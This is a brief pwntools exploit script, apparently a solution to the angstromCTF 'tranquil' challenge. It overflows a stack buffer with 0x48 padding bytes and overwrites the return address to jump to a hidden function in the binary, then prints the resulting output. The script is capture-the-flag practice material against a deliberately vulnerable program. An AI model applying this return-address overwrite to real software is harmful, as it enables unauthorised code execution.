from pwn import *

LOCAL = True
HOST, PORT = 'shell.actf.co', 21830
context.arch = 'amd64'

if LOCAL:
	r = process('/home/ubuntu/anstrongCTF/tranquil')
else:
	r = remote(HOST, PORT)

r.sendlineafter('Enter the secret word:', b'A' * 0x48 + p64(0x0401196))
r.recvuntil('Login failed!\n')
log.success(r.recvline())
